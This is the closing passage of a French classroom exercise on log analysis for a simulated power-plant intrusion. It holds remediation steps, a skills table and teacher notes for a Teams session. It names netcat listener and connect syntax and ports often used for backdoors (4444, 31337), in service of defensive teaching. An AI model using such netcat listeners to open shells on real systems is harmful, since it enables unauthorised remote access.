> **Mesures recommandées :** Bloquer l'IP 10.0.0.55, fermer les ports 4444/31337/9999, désactiver le compte maintenance, mettre en place un système de détection d'intrusion, et limiter les tentatives de connexion SSH.

---

## 📝 Résumé des Compétences Évaluées

| Compétence | Niveau | Commandes/Outils |
|------------|--------|-------------------|
| Rechercher dans des fichiers | 1 | `grep`, `grep -c`, `grep -v`, `grep -oE` |
| Extraire des colonnes de données | 1-2 | `awk '{print $N}'` |
| Transformer du texte | 1 | `sed 's/.../.../'` |
| Trier et dédupliquer | 1-2 | `sort`, `sort -u`, `uniq -c` |
| Comprendre les adresses IP | 2 | Notation IP, réseaux privés vs publics |
| Connaître les ports standards | 2 | 22, 80, 443, 3306, 8080 |
| Comprendre netcat | 2 | `nc -l -p`, `nc host port` |
| Écrire des scripts bash | 3 | Variables, boucles, conditions, paramètres |
| Écrire du Python basique | 3 | Lecture de fichiers, conditions, formatage |
| Générer des règles firewall | 3 | Syntaxe `iptables` |
| Analyse et synthèse | 4 | Rapport d'incident |

---

## 🧑‍🏫 Notes pour l'enseignant

**Déroulement suggéré sur Teams :**

1. **Partager l'écran** et lancer `simulateur_trafic.sh` pour créer l'ambiance au début
2. **Envoyer** le dossier `logs_centrale/` aux étudiants via Teams
3. **Niveau 1 :** Les étudiants travaillent individuellement, vous corrigez en live
4. **Niveau 2 :** Démonstration netcat en partage d'écran, puis travail individuel
5. **Pause** ☕ (10-15 min)
6. **Niveau 3 :** Les étudiants codent, vous montrez les solutions à la fin
7. **Niveau 4 :** Rapport rapide + discussion collective

**Variantes possibles :**
- Travailler en équipes de 2-3 via les salles Teams
- Ajouter un système de points / compétition entre équipes
- Pour les plus rapides : leur demander de modifier `simulateur_trafic.sh` pour ajouter de nouveaux types d'attaques

**Indices à donner si les étudiants sont bloqués :**
- Niveau 1 : « Regardez les adresses IP qui ne commencent pas par 192.168 »
- Niveau 2 : « Comparez les heures des logs access.log et capteurs.log »
- Niveau 3 : « Commencez par grep, puis pipez avec | vers awk ou sed »